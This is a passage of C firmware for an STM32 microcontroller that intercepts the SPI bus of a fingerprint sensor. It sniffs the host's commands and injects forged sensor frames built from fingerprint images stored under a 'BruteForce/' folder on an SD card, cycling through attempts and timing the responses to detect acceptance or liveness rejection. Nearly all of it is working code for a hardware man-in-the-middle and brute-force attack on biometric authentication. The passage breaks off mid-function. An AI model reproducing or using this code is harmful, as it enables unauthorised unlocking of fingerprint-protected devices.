/* USER CODE BEGIN Header */
/**
  ******************************************************************************
  * @file           : main.c
  * @brief          : Main program body
  ******************************************************************************
  * @attention
  *
  * <h2><center>&copy; Copyright (c) 2021 STMicroelectronics.
  * All rights reserved.</center></h2>
  *
  * This software component is licensed by ST under BSD 3-Clause license,
  * the "License"; You may not use this file except in compliance with the
  * License. You may obtain a copy of the License at:
  *                        opensource.org/licenses/BSD-3-Clause
  *
  ******************************************************************************
  */
/* USER CODE END Header */
/* Includes ------------------------------------------------------------------*/
#include "main.h"
#include "fatfs.h"
#include "usb_device.h"

/* Private includes ----------------------------------------------------------*/
/* USER CODE BEGIN Includes */
#include "os_api.h"
#include "checksum.h"
#include "romimg.h"
#include "arm_math.h"
#include "stm32f4xx_hal_def.h"
/* USER CODE END Includes */

/* Private typedef -----------------------------------------------------------*/
/* USER CODE BEGIN PTD */
/* USER CODE END PTD */

/* Private define ------------------------------------------------------------*/
/* USER CODE BEGIN PD */
#define IDLE    0
#define PREPARE 1
#define SNIFFER   2
#define PROCESS 3
#define IDLE_STK_SZ      2048
#define PREPARE_STK_SZ   8096
#define SNIFFER_STK_SZ   8096
#define PROCESS_STK_SZ   2048
#define TRY0_INJECT_ON 1
#define TRY1_INJECT_ON 1
#define TRY2_INJECT_ON 1
#define USE_FULL_ASSERT
#define BMP_SIZE 44086
/* USER CODE END PD */

/* Private macro -------------------------------------------------------------*/
/* USER CODE BEGIN PM */
enum try_state_t{ TRY0_1,TRY0_2,TRY0_3,TRY0_4,TRY1_1,TRY1_2,TRY1_3,TRY1_4,TRY1_5,TRY1_6,TRY1_7,TRY1_8,TRY1_9,TRY1_10,TRY1_11,TRY1_12,TRY1_13,TRY2_1,TRY2_2,TRY2_3,TRY2_4,TRY2_5,TRY2_6,TRY2_7,TRY2_8,TRY2_9,TRY2_10,TRY2_11,TRY2_12,TRY2_13,TRY3_1,TRY3_2,TRY3_3,TRY3_4,TRY3_5,TRY3_6,TRY3_7,TRY3_8,TRY3_9,TRY3_10,TRY3_11,TRY3_12,TRY3_13,CANCELING };
enum reason_t{SPI_TX_ERROR,SPI_TX_DMA_ERROR,SPI_TX_TIMEOUT,SPI_RX_DMA_ERROR,SPI_TXRX_DMA_ERROR,SPI_TXRX_TIMEOUT,SPI_CHECK_ERROR,SUCESS_OR_TOOFAST_OR_UNLIVE,MOSI_CMD_ERROR,BMP_FILE_NOT_EXIST};
/* USER CODE END PM */

/* Private variables ---------------------------------------------------------*/
I2C_HandleTypeDef hi2c2;

SD_HandleTypeDef hsd;
DMA_HandleTypeDef hdma_sdio_rx;
DMA_HandleTypeDef hdma_sdio_tx;

SPI_HandleTypeDef hspi1;
DMA_HandleTypeDef hdma_spi1_rx;
DMA_HandleTypeDef hdma_spi1_tx;

UART_HandleTypeDef huart1;

/* USER CODE BEGIN PV */
unsigned char __attribute__((aligned(8)))idle_stack[IDLE_STK_SZ];
unsigned char __attribute__((aligned(8)))prepare_stack[PREPARE_STK_SZ];
unsigned char __attribute__((aligned(8)))sniffer_stack[SNIFFER_STK_SZ];
unsigned char __attribute__((aligned(8)))process_stack[PROCESS_STK_SZ];
__IO uint8_t cmd_buf[2];
__IO enum try_state_t try_state = TRY0_1;
__IO uint32_t inject_cnt = 0;
uint16_t sw_state;

uint8_t watchdog1=0,watchdog2=0,watchdog3=0;

uint8_t * __IO inject_buf;
OS_EVENT SemBin;
OS_EVENT SemBin2;

uint8_t global_buf[BMP_SIZE+BMP_SIZE+BMP_SIZE+(7169*12+897)];

uint8_t *sd_bmp_buf_try0 = global_buf;
uint8_t *sd_bmp_buf_try1 = global_buf+BMP_SIZE;
uint8_t *sd_bmp_buf_try2 = global_buf+BMP_SIZE+BMP_SIZE;
uint8_t *try_data_buf = global_buf+BMP_SIZE+BMP_SIZE+BMP_SIZE;

uint8_t *try0_rev_buf = global_buf;
uint8_t *try1_rev_buf = global_buf+1+28672+1+28672+1+28672+1+896;

/* USER CODE END PV */

/* Private function prototypes -----------------------------------------------*/
void SystemClock_Config(void);
static void MX_GPIO_Init(void);
static void MX_DMA_Init(void);
static void MX_SDIO_SD_Init(void);
static void MX_SPI1_Init(void);
static void MX_I2C2_Init(void);
static void MX_USART1_UART_Init(void);
/* USER CODE BEGIN PFP */
void HAL_SPI_MspInit_Capture(SPI_HandleTypeDef* hspi);
HAL_StatusTypeDef HAL_SPI_Init_Capture(SPI_HandleTypeDef *hspi);
void MX_SPI1_Init_Capture(void);
/* USER CODE END PFP */

/* Private user code ---------------------------------------------------------*/
/* USER CODE BEGIN 0 */
void Delay(uint32_t ms)
{
	uint32_t i,j,k;

	for(i=0;i<ms;i++)
		for(j=0;j<0x1000;j++)
			k++;
}

void Exception_Handler(uint32_t inject_cnt, enum try_state_t try_state, enum reason_t reason,uint8_t ifrestart){
	SPDT_FakeMISO_On();
	Clicker_Release();
	SD_Log(inject_cnt, (uint8_t)try_state, (uint8_t)reason);
	inject_cnt++;
	if(ifrestart!=1)
		SD_DelInjectCntFile();
	else
		SD_SaveInjectCntFile(inject_cnt);

	__disable_irq();

	Segment_ShowErrorCode(reason);
	LED_ON(STATE_LED);

	Delay(1000);

	if(ifrestart){
		NVIC_SystemReset();
	}else{
		while(1){
			LED_OFF(STATE_LED);
			Delay(500);
			LED_ON(STATE_LED);
			Delay(500);
		}
	}
}




void SPI1_Cplt_Callback(SPI_HandleTypeDef *hspi){
	OSSemBinGive(&SemBin);
}

void SPI1_TX_Error_Callback(SPI_HandleTypeDef *hspi){
	Exception_Handler(inject_cnt, try_state, SPI_TX_ERROR, 1);
}

void IdleTask(void *para){
	while(1){
		OS_STK_INFO StkInfo;
		OSStkCheck(IDLE, &StkInfo);
		OSStkCheck(SNIFFER, &StkInfo);
		OSStkCheck(PREPARE, &StkInfo);
		OSStkCheck(PREPARE, &StkInfo);
	}
}

void PrepareTask(void *para){
	unsigned int sn;
	unsigned short sum, crc;

    while(1){
    	switch(try_state){
    		case TRY0_1:
    			if(TRY0_INJECT_ON && (sw_state!=SW_RC)){
    				if(SD_ReadFingerprintBMP(inject_cnt, "BruteForce/try0/", sd_bmp_buf_try0,BMP_SIZE) == 0)
    					Exception_Handler(inject_cnt, try_state, BMP_FILE_NOT_EXIST,0);
    			}
    			if(TRY1_INJECT_ON && (sw_state!=SW_RC)){
        			if(SD_ReadFingerprintBMP(inject_cnt, "BruteForce/try1/", sd_bmp_buf_try1,BMP_SIZE) == 0)
        				Exception_Handler(inject_cnt, try_state, BMP_FILE_NOT_EXIST,0);
    			}
    			if(TRY2_INJECT_ON && (sw_state!=SW_RC)){
        			if(SD_ReadFingerprintBMP(inject_cnt, "BruteForce/try2/", sd_bmp_buf_try2,BMP_SIZE) == 0)
        				Exception_Handler(inject_cnt, try_state, BMP_FILE_NOT_EXIST,0);
    			}

       			if(TRY0_INJECT_ON && (sw_state!=SW_RC)){
           			for(int i=0;i<224;i++){
    					for(int j=0;j<192;j++)
    						*(uint16_t *)&(try_data_buf[1+388*i+2+j*2]) = 8191/255*(uint16_t)sd_bmp_buf_try0[BMP_SIZE - 192*(i+1)+j];
    					crc = gf_crc_rawdata((unsigned char *)(try_data_buf+1+388*i+2),384);
    					try_data_buf[1+388*i+0] = i+1;
    					try_data_buf[1+388*i+1] = 0x04;
    					try_data_buf[1+388*i+386] = *((unsigned char *)&crc);
    					try_data_buf[1+388*i+387] = *(((unsigned char *)&crc)+1);
    				}
       				inject_buf = try_data_buf;
       			}
       			else
       				inject_buf = (uint8_t *)liveness_try0_part1;
    			OSResumeTask(SNIFFER);
    			break;

    		case TRY0_2:
    			if(TRY0_INJECT_ON && (sw_state!=SW_RC))
    				inject_buf = try_data_buf+28672;
    			else
    				inject_buf = (uint8_t *)liveness_try0_part2;
    		    break;

    		case TRY0_3:
    			if(TRY0_INJECT_ON && (sw_state!=SW_RC))
    				inject_buf = try_data_buf+28672*2;
    			else
    				inject_buf = (uint8_t *)liveness_try0_part3;
    			break;

    		case TRY0_4:
    			if(TRY0_INJECT_ON && (sw_state!=SW_RC))
    				inject_buf = try_data_buf+28672*3;
    			else
    				inject_buf = (uint8_t *)liveness_try0_part4;
    		    break;

    		case TRY1_1:
    			if(sw_state==SW_TE){
					if(SD_ReadFingerprintBMP(inject_cnt, "TemplateEnroll/", sd_bmp_buf_try1,BMP_SIZE) == 0)
						Exception_Handler(inject_cnt, try_state, BMP_FILE_NOT_EXIST,0);
    			}
    			if(TRY1_INJECT_ON && (sw_state!=SW_RC)){
        			sn = 0x2C02;
        			for(int i=0;i<224;i++){
        				for(int j=0;j<192;j++)
        					*(uint16_t *)&(try_data_buf[1+388*i+2+j*2]) = 8191/255*(uint16_t)sd_bmp_buf_try1[BMP_SIZE - 192*(i+1)+j];
        				sum = gf_checksum_rawdata((unsigned char *)(try_data_buf+1+388*i+2),384);
        				*(unsigned short *)&(try_data_buf[1+388*i+0]) = sn;
        				sn += 2;
        				try_data_buf[1+388*i+386] = *((unsigned char *)&sum);
        				try_data_buf[1+388*i+387] = *(((unsigned char *)&sum)+1);
        			}
    				inject_buf = try_data_buf;
    			}
    			else
    				inject_buf = (uint8_t *)part1;
    			if(sw_state==SW_TE)
    				OSResumeTask(SNIFFER);////
    			break;

    		case TRY1_2:
    			if(TRY1_INJECT_ON && (sw_state!=SW_RC))
    				inject_buf = try_data_buf+7168;
    			else
    				inject_buf = (uint8_t *)part2;
    		    break;

    		case TRY1_3:
    			if(TRY1_INJECT_ON && (sw_state!=SW_RC))
    				inject_buf = try_data_buf+7168*2;
    			else
    				inject_buf = (uint8_t *)part3;
    			break;

    		case TRY1_4:
    			if(TRY1_INJECT_ON && (sw_state!=SW_RC))
    				inject_buf = try_data_buf+7168*3;
    			else
    				inject_buf = (uint8_t *)part4;
    		    break;

    		case TRY1_5:
    			if(TRY1_INJECT_ON && (sw_state!=SW_RC))
    				inject_buf = try_data_buf+7168*4;
    			else
    				inject_buf = (uint8_t *)part5;
    			break;

    		case TRY1_6:
    			if(TRY1_INJECT_ON && (sw_state!=SW_RC))
    				inject_buf = try_data_buf+7168*5;
    			else
    				inject_buf = (uint8_t *)part6;
    		    break;

    		case TRY1_7:
    			if(TRY1_INJECT_ON && (sw_state!=SW_RC))
    				inject_buf = try_data_buf+7168*6;
    			else
    				inject_buf = (uint8_t *)part7;
    			break;

    		case TRY1_8:
    			if(TRY1_INJECT_ON && (sw_state!=SW_RC))
    				inject_buf = try_data_buf+7168*7;
    			else
    				inject_buf = (uint8_t *)part8;
    		    break;

    		case TRY1_9:
    			if(TRY1_INJECT_ON && (sw_state!=SW_RC))
    				inject_buf = try_data_buf+7168*8;
    			else
    				inject_buf = (uint8_t *)part9;
    			break;

    		case TRY1_10:
    			if(TRY1_INJECT_ON && (sw_state!=SW_RC))
    				inject_buf = try_data_buf+7168*9;
    			else
    				inject_buf = (uint8_t *)part10;
    		    break;

    		case TRY1_11:
    			if(TRY1_INJECT_ON && (sw_state!=SW_RC))
    				inject_buf = try_data_buf+7168*10;
    			else
    				inject_buf = (uint8_t *)part11;
    			break;

    		case TRY1_12:
    			if(TRY1_INJECT_ON && (sw_state!=SW_RC))
    				inject_buf = try_data_buf+7168*11;
    			else
    				inject_buf = (uint8_t *)part12;
    		    break;

    		case TRY1_13:
    			if(TRY1_INJECT_ON && (sw_state!=SW_RC))
    				inject_buf = try_data_buf+7168*12;
    			else
    				inject_buf = (uint8_t *)part13;
    		    break;

    		case TRY2_1:
    			if(TRY2_INJECT_ON && (sw_state!=SW_RC)){
        			sn = 0x2C02;
        			for(int i=0;i<224;i++){
        				for(int j=0;j<192;j++)
        					*(uint16_t *)&(try_data_buf[1+388*i+2+j*2]) = 8191/255*(uint16_t)sd_bmp_buf_try2[BMP_SIZE - 192*(i+1)+j];
        				sum = gf_checksum_rawdata((unsigned char *)(try_data_buf+1+388*i+2),384);
        				*(unsigned short *)&(try_data_buf[1+388*i+0]) = sn;
        				sn += 2;
        				try_data_buf[1+388*i+386] = *((unsigned char *)&sum);
        				try_data_buf[1+388*i+387] = *(((unsigned char *)&sum)+1);
        			}
    				inject_buf = try_data_buf;
    			}
    			else
    				inject_buf = (uint8_t *)part1;
    			break;

    		case TRY2_2:
    			if(TRY2_INJECT_ON && (sw_state!=SW_RC))
    				inject_buf = try_data_buf+7168;
    			else
    				inject_buf = (uint8_t *)part2;
    		    break;

    		case TRY2_3:
    			if(TRY2_INJECT_ON && (sw_state!=SW_RC))
    				inject_buf = try_data_buf+7168*2;
    			else
    				inject_buf = (uint8_t *)part3;
    			break;

    		case TRY2_4:
    			if(TRY2_INJECT_ON && (sw_state!=SW_RC))
    				inject_buf = try_data_buf+7168*3;
    			else
    				inject_buf = (uint8_t *)part4;
    		    break;

    		case TRY2_5:
    			if(TRY2_INJECT_ON && (sw_state!=SW_RC))
    				inject_buf = try_data_buf+7168*4;
    			else
    				inject_buf = (uint8_t *)part5;
    			break;

    		case TRY2_6:
    			if(TRY2_INJECT_ON && (sw_state!=SW_RC))
    				inject_buf = try_data_buf+7168*5;
    			else
    				inject_buf = (uint8_t *)part6;
    		    break;

    		case TRY2_7:
    			if(TRY2_INJECT_ON && (sw_state!=SW_RC))
    				inject_buf = try_data_buf+7168*6;
    			else
    				inject_buf = (uint8_t *)part7;
    			break;

    		case TRY2_8:
    			if(TRY2_INJECT_ON && (sw_state!=SW_RC))
    				inject_buf = try_data_buf+7168*7;
    			else
    				inject_buf = (uint8_t *)part8;
    		    break;

    		case TRY2_9:
    			if(TRY2_INJECT_ON && (sw_state!=SW_RC))
    				inject_buf = try_data_buf+7168*8;
    			else
    				inject_buf = (uint8_t *)part9;
    			break;

    		case TRY2_10:
    			if(TRY2_INJECT_ON && (sw_state!=SW_RC))
    				inject_buf = try_data_buf+7168*9;
    			else
    				inject_buf = (uint8_t *)part10;
    		    break;

    		case TRY2_11:
    			if(TRY2_INJECT_ON && (sw_state!=SW_RC))
    				inject_buf = try_data_buf+7168*10;
    			else
    				inject_buf = (uint8_t *)part11;
    			break;

    		case TRY2_12:
    			if(TRY2_INJECT_ON && (sw_state!=SW_RC))
    				inject_buf = try_data_buf+7168*11;
    			else
    				inject_buf = (uint8_t *)part12;
    		    break;

    		case TRY2_13:
    			if(TRY2_INJECT_ON && (sw_state!=SW_RC))
    				inject_buf = try_data_buf+7168*12;
    			else
    				inject_buf = (uint8_t *)part13;
    		    break;

	  		case TRY3_1:case TRY3_2:case TRY3_3:case TRY3_4:case TRY3_5:case TRY3_6:case TRY3_7:case TRY3_8:case TRY3_9:case TRY3_10:case TRY3_11:case TRY3_12:case TRY3_13:
				break;

    		default:
    			break;
    	}
    	OSSemBinTake(&SemBin2,OS_ALWAYS_DELAY);
    }
}

void InjectMISO(uint8_t *txbuff, uint8_t *rxbuff, uint32_t buffsize, uint32_t timeout, uint8_t start,uint8_t ifstart){
	if(sw_state==SW_PA)
		return;

	SPDT_FakeMISO_On(); ////
	HAL_SPI_DMAStop(&hspi1);
	if(ifstart)
		txbuff[0] = start;
	if(rxbuff==NULL){
		if(HAL_SPI_Transmit_DMA(&hspi1, txbuff, buffsize)!=HAL_OK)
			Exception_Handler(inject_cnt, try_state, SPI_TX_DMA_ERROR, 1);
		if( (try_state!=TRY0_1) &&  (try_state!=TRY1_1) && (try_state!=TRY2_1) && (try_state!=TRY3_1)){
			if(sw_state!=SW_PA)
				OSSemBinGive(&SemBin2);
		}
		if (OSSemBinTake(&SemBin,timeout) == 0)
			Exception_Handler(inject_cnt, try_state, SPI_TX_TIMEOUT, 1);
		if( HAL_SPI_Receive_DMA(&hspi1, (uint8_t *)cmd_buf, 2)!=HAL_OK )
			Exception_Handler(inject_cnt, try_state, SPI_RX_DMA_ERROR, 1);
	}else{
		HAL_SPI_DeInit(&hspi1);
		HAL_DMA_DeInit(&hdma_spi1_rx);
		MX_DMA_Init();
		MX_SPI1_Init_Capture();
		HAL_SPI_RegisterCallback(&hspi1, HAL_SPI_TX_COMPLETE_CB_ID, SPI1_Cplt_Callback);
		HAL_SPI_RegisterCallback(&hspi1, HAL_SPI_ERROR_CB_ID, SPI1_TX_Error_Callback);
		HAL_SPI_RegisterCallback(&hspi1, HAL_SPI_TX_RX_COMPLETE_CB_ID, SPI1_Cplt_Callback);
		HAL_NVIC_EnableIRQ(DMA2_Stream0_IRQn);
		SPDT_ReadMISO();
		if(HAL_SPI_TransmitReceive_DMA(&hspi1, txbuff,rxbuff, buffsize)!=HAL_OK)
			Exception_Handler(inject_cnt, try_state, SPI_TXRX_DMA_ERROR, 1);
		if( (try_state!=TRY0_1) &&  (try_state!=TRY1_1) && (try_state!=TRY2_1) && (try_state!=TRY3_1)){
			if(sw_state!=SW_PA)
				OSSemBinGive(&SemBin2);
		}
		if (OSSemBinTake(&SemBin,timeout) == 0)
			Exception_Handler(inject_cnt, try_state, SPI_TXRX_TIMEOUT, 1);
		SPDT_ReadMOSI();
		HAL_SPI_DeInit(&hspi1);
		HAL_DMA_DeInit(&hdma_spi1_rx);
		MX_DMA_Init();
		HAL_NVIC_DisableIRQ(DMA2_Stream0_IRQn);
		MX_SPI1_Init();
		HAL_SPI_RegisterCallback(&hspi1, HAL_SPI_TX_COMPLETE_CB_ID, SPI1_Cplt_Callback);
		HAL_SPI_RegisterCallback(&hspi1, HAL_SPI_ERROR_CB_ID, SPI1_TX_Error_Callback);
		HAL_SPI_RegisterCallback(&hspi1, HAL_SPI_TX_RX_COMPLETE_CB_ID, SPI1_Cplt_Callback);
		if( HAL_SPI_Receive_DMA(&hspi1, (uint8_t *)cmd_buf, 2)!=HAL_OK )
			Exception_Handler(inject_cnt, try_state, SPI_RX_DMA_ERROR, 1);

	}
	SPDT_FakeMISO_Off();
}

void Sniffer(void *para){
	uint16_t cmd;
	uint32_t ts_s=0,ts_e,dur=0;

	if(sw_state==SW_PA){
		OSSuspendTask(PREPARE);
	}else{
		OSSuspendTask(SNIFFER);
	}
	SPDT_FakeMISO_Off();

	HAL_SPI_Receive_DMA(&hspi1, (uint8_t *)cmd_buf, 2);
    while(1){
    		cmd = *(volatile uint16_t *)cmd_buf;
    		if (SPI_CHECK_FLAG(hspi1.Instance->SR, SPI_FLAG_OVR) != RESET){
    			Exception_Handler(inject_cnt, try_state, SPI_CHECK_ERROR, 1);
    		}
			switch(cmd){
				//Monitor the FDA command
			    case 0x88F0:case 0xF088:case 0x8800:case 0x0088: case 0xA4F0:case 0xF0A4:case 0x00A4:case 0xA400: case 0xC0F0:case 0xF0C0:case 0x00C0:case 0xC000: case 0xDCF0:case 0xF0DC:case 0x00DC:case 0xDC00:{
			    	if(ts_s==0)
			    		ts_s = HAL_GetTick();
			    	ts_e = HAL_GetTick();
			    	dur = ts_e-ts_s;
			    	ts_s = ts_e;
			    	watchdog1=0;
			    	watchdog2=0;
			    	watchdog3=0;

			    	if(sw_state!=SW_TE){
						if(try_state==TRY1_1){
							if( dur >700 ){
								Exception_Handler(inject_cnt, try_state, SUCESS_OR_TOOFAST_OR_UNLIVE, 1);
							}
						}else if(try_state==TRY2_1){
							if( dur >500 ){
								Exception_Handler(inject_cnt, try_state, SUCESS_OR_TOOFAST_OR_UNLIVE, 1);
							}
						}else if(try_state==TRY3_1){
							if( dur >500 ){
								Exception_Handler(inject_cnt, try_state, SUCESS_OR_TOOFAST_OR_UNLIVE, 1);
							}
						}
			    	}
				    cmd_buf[0] = 0xff;
				    cmd_buf[1] = 0xff;
			    	switch(try_state){
			    		case TRY0_1:
			    			LED_ON(EYE_LED);
			    			if( !((cmd==0x88F0) || (cmd==0xF088) || (cmd==0x8800) || (cmd==0x0088)) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY0_2;

			    			if(sw_state==SW_RC){
			    				InjectMISO((unsigned char *)inject_buf, try0_rev_buf,28673,15*2,0x00,0);
			    			}else{
								if(TRY0_INJECT_ON)
									InjectMISO((unsigned char *)inject_buf, NULL,28673,15*2,0x00,1);
								else
									InjectMISO((unsigned char *)inject_buf, NULL,28673,15*2,0x00,0);
			    			}
			    			break;
			    		case TRY0_2:
			    			if( !((cmd==0x88F0) || (cmd==0xF088) || (cmd==0x8800) || (cmd==0x0088)) || (dur<9) || (dur>18) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY0_3;

			    			if(sw_state==SW_RC){
			    				InjectMISO((unsigned char *)inject_buf, try0_rev_buf+28673,28673,15*2,0x40,0);
			    			}else{
								if(TRY0_INJECT_ON)
									InjectMISO((unsigned char *)inject_buf, NULL,28673,15*2,0x40,1);
								else
									InjectMISO((unsigned char *)inject_buf, NULL,28673,15*2,0x40,0);
			    			}
			    			break;
			    		case TRY0_3:
			    			if( !((cmd==0x88F0) || (cmd==0xF088) || (cmd==0x8800) || (cmd==0x0088)) || (dur<9) || (dur>18) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY0_4;

			    			if(sw_state==SW_RC){
			    				InjectMISO((unsigned char *)inject_buf, try0_rev_buf+28673*2,28673,15*2,0x40,0);
			    			}else{
								if(TRY0_INJECT_ON)
									InjectMISO((unsigned char *)inject_buf, NULL,28673,15*2,0x40,1);
								else
									InjectMISO((unsigned char *)inject_buf, NULL,28673,15*2,0x40,0);
			    			}
			    			break;
			    		case TRY0_4:
			    			if( !((cmd==0x88F0) || (cmd==0xF088) || (cmd==0x8800) || (cmd==0x0088)) || (dur<9) || (dur>18) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY1_1;

			    			if(sw_state==SW_RC){
			    				InjectMISO((unsigned char *)inject_buf, try0_rev_buf+28673*3, 897,3*2,0x40,0);
			    			}else{
								if(TRY0_INJECT_ON)
									InjectMISO((unsigned char *)inject_buf, NULL, 897,3*2,0x40,1);
								else
									InjectMISO((unsigned char *)inject_buf, NULL, 897,3*2,0x40,0);
			    			}
			    			OSSemBinGive(&SemBin2);
			    			OSDelayTask(100);
			    			break;

			    		case TRY1_1:
			    			if(sw_state==SW_TE){
			    				if( !((cmd==0x88F0) || (cmd==0xF088) || (cmd==0x8800) || (cmd==0x0088)) ){
			    					Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    				}else{
			    					LED_ON(EYE_LED);
			    				}
			    			}else{
			    				if( !((cmd==0x88F0) || (cmd==0xF088) || (cmd==0x8800) || (cmd==0x0088)) || (dur<100) )
			    					Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			}
			    			try_state = TRY1_2;

			    			if(sw_state==SW_RC){
			    				InjectMISO((unsigned char *)inject_buf,try1_rev_buf, 7169, 5*2, 0x00,0);
			    			}else{
								if(TRY1_INJECT_ON)
									InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,1);
								else
									InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,0);
			    			}
			    			break;
			    		case TRY1_2:
			    			if( !((cmd==0xA4F0) || (cmd==0xF0A4) || (cmd==0xA400) || (cmd==0x00A4)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY1_3;

			    			if(sw_state==SW_RC){
			    				InjectMISO((unsigned char *)inject_buf,try1_rev_buf+7169, 7169, 5*2, 0x00,0);
			    			}else{
								if(TRY1_INJECT_ON)
									InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,1);
								else
									InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,0);
			    			}
			    			break;
			    		case TRY1_3:
			    			if( !((cmd==0xC0F0) || (cmd==0xF0C0) || (cmd==0xC000) || (cmd==0x00C0)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY1_4;

			    			if(sw_state==SW_RC){
			    				InjectMISO((unsigned char *)inject_buf,try1_rev_buf+7169*2, 7169, 5*2, 0x00,0);
			    			}else{
								if(TRY1_INJECT_ON)
									InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,1);
								else
									InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,0);
			    			}
			    			break;
			    		case TRY1_4:
			    			if( !((cmd==0xDCF0) || (cmd==0xF0DC) || (cmd==0xDC00) || (cmd==0x00DC)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY1_5;

			    			if(sw_state==SW_RC){
			    				InjectMISO((unsigned char *)inject_buf,try1_rev_buf+7169*3, 7169, 5*2, 0x00,0);
			    			}else{
								if(TRY1_INJECT_ON)
									InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,1);
								else
									InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,0);
			    			}
			    			break;
			    		case TRY1_5:
			    			if( !((cmd==0x88F0) || (cmd==0xF088) || (cmd==0x8800) || (cmd==0x0088)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY1_6;

			    			if(sw_state==SW_RC){
			    				InjectMISO((unsigned char *)inject_buf,try1_rev_buf+7169*4, 7169, 5*2, 0x00,0);
			    			}else{
								if(TRY1_INJECT_ON)
									InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,1);
								else
									InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,0);
			    			}
			    			break;
			    		case TRY1_6:
			    			if( !((cmd==0xA4F0) || (cmd==0xF0A4) || (cmd==0xA400) || (cmd==0x00A4)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY1_7;

			    			if(sw_state==SW_RC){
			    				InjectMISO((unsigned char *)inject_buf,try1_rev_buf+7169*5, 7169, 5*2, 0x00,0);
			    			}else{
								if(TRY1_INJECT_ON)
									InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,1);
								else
									InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,0);
			    			}
			    			break;
			    		case TRY1_7:
			    			if( !((cmd==0xC0F0) || (cmd==0xF0C0) || (cmd==0xC000) || (cmd==0x00C0)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY1_8;

			    			if(sw_state==SW_RC){
			    				InjectMISO((unsigned char *)inject_buf,try1_rev_buf+7169*6, 7169, 5*2, 0x00,0);
			    			}else{
								if(TRY1_INJECT_ON)
									InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,1);
								else
									InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,0);
			    			}
			    			break;
			    		case TRY1_8:
			    			if( !((cmd==0xDCF0) || (cmd==0xF0DC) || (cmd==0xDC00) || (cmd==0x00DC)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY1_9;

			    			if(sw_state==SW_RC){
			    				InjectMISO((unsigned char *)inject_buf,try1_rev_buf+7169*7, 7169, 5*2, 0x00,0);
			    			}else{
								if(TRY1_INJECT_ON)
									InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,1);
								else
									InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,0);
			    			}
			    			break;
			    		case TRY1_9:
			    			if( !((cmd==0x88F0) || (cmd==0xF088) || (cmd==0x8800) || (cmd==0x0088)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY1_10;

			    			if(sw_state==SW_RC){
			    				InjectMISO((unsigned char *)inject_buf,try1_rev_buf+7169*8, 7169, 5*2, 0x00,0);
			    			}else{
								if(TRY1_INJECT_ON)
									InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,1);
								else
									InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,0);
			    			}
			    			break;
			    		case TRY1_10:
			    			if( !((cmd==0xA4F0) || (cmd==0xF0A4) || (cmd==0xA400) || (cmd==0x00A4)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY1_11;

			    			if(sw_state==SW_RC){
			    				InjectMISO((unsigned char *)inject_buf,try1_rev_buf+7169*9, 7169, 5*2, 0x00,0);
			    			}else{
								if(TRY1_INJECT_ON)
									InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,1);
								else
									InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,0);
			    			}
			    			break;
			    		case TRY1_11:
			    			if( !((cmd==0xC0F0) || (cmd==0xF0C0) || (cmd==0xC000) || (cmd==0x00C0)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY1_12;

			    			if(sw_state==SW_RC){
			    				InjectMISO((unsigned char *)inject_buf,try1_rev_buf+7169*10, 7169, 5*2, 0x00,0);
			    			}else{
								if(TRY1_INJECT_ON)
									InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,1);
								else
									InjectMISO((unsigned char *)inject_buf,NULL, 7169, 5*2, 0x00,0);
			    			}
			    			break;
			    		case TRY1_12:
			    			if( !((cmd==0xDCF0) || (cmd==0xF0DC) || (cmd==0xDC00) || (cmd==0x00DC)) || (dur<2) || (dur>8) )
			    				Exception_Handler(inject_cnt, try_state, MOSI_CMD_ERROR, 1);
			    			try_state = TRY1_13;

